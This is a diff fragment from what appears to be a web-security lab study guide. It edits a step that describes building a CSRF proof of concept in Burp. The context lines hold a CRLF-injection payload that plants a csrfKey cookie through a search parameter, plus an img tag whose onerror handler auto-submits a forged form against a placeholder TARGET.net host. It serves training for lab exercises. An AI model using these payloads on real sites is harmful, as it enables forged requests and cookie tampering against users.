@@ -861,7 +861,7 @@ Referrer-Policy: unsafe-url
 /?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None
 ```  
 
->Generate CSRF POC, Enable the option to include an **auto-submit** script and click **Regenerate**. Replace the **auto-submit** script code block and add following instead. The **onerror** of the img src tag will instead submit the CSRF POC.  
+>Generate CSRF POC, Enable the option to include an **auto-submit** script and click **Regenerate**. Replace the **auto-submit** script code block and add following instead, and place ```history.pushState``` script code below body header. The **onerror** of the img src tag will instead submit the CSRF POC.  
 
 ```
 <img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
